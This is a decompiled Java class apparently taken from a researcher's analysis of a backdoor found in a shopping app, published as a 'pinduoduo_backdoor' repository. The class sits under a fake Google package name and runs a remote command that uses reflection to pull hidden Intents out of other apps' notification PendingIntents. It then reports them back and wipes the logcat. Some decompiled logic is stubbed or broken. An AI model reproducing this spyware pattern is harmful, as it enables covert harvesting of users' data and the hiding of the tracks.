package com.google.android.sd.biz_dynamic_dex.ud_parse_nmessage;

import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.os.Parcelable;
import android.text.TextUtils;
import com.google.android.sd.biz_dynamic_dex.base.DynamicCmdExecutor;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.Utils;
import java.lang.reflect.Method;
import org.json.JSONObject;

public class UdParseNotifyMessageExecutor extends DynamicCmdExecutor {
  private static final int CMD = 1053;
  
  private void fail(Context paramContext, CmdData paramCmdData, String paramString) {
    CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(paramCmdData, paramString, null));
  }
  
  private void parse(Context paramContext, String paramString, Intent paramIntent) {
    if (paramContext != null) {
      String str;
      if (TextUtils.isEmpty(paramString))
        return; 
      CmdData cmdData = new CmdData(1053, (new JSONObject(paramString)).optString("uuid"), "client");
      if (paramIntent == null) {
        paramString = "intent empty";
      } else {
        try {
          Bundle bundle = paramIntent.getExtras();
          JSONObject jSONObject1 = new JSONObject();
          for (String str1 : bundle.keySet()) {
            Object object = bundle.get(str1);
            if (object instanceof Parcelable)
              jSONObject1.put(str1, parseIntent((Parcelable)object)); 
          } 
          JSONObject jSONObject2 = new JSONObject();
          jSONObject2.put("target_intent_uri", jSONObject1);
          CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(cmdData, jSONObject2, null));
          return;
        } catch (Exception exception) {
          StringBuilder stringBuilder = new StringBuilder("parse_fail_");
          stringBuilder.append(exception.getMessage());
          str = stringBuilder.toString();
        } 
      } 
      fail(paramContext, cmdData, str);
      return;
    } 
  }
  
  private String parseIntent(Parcelable paramParcelable) {
    try {
      PendingIntent pendingIntent = (PendingIntent)paramParcelable;
      Method method = pendingIntent.getClass().getDeclaredMethod("getIntent", new Class[0]);
      method.setAccessible(true);
      Intent intent = (Intent)method.invoke(pendingIntent, new Object[0]);
      return (intent == null) ? "parse_pending_intent_fail" : intent.toURI();
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder("parse_pending_intent_exception");
      stringBuilder.append(exception.getMessage());
      return stringBuilder.toString();
    } 
  }
  
  public void executeWithParcelable(Context paramContext, String paramString, Intent paramIntent) {
    try {
      return;
    } finally {
      paramContext = null;
      Utils.clearLogcat();
    } 
  }
  
  protected void realExecute(Context paramContext, String paramString) {
    executeWithParcelable(paramContext, paramString, null);
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\f35735a5cbf445c785237797138d246a-dex2jar.jar!\com\google\android\sd\biz_dynamic_de\\ud_parse_nmessage\UdParseNotifyMessageExecutor.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */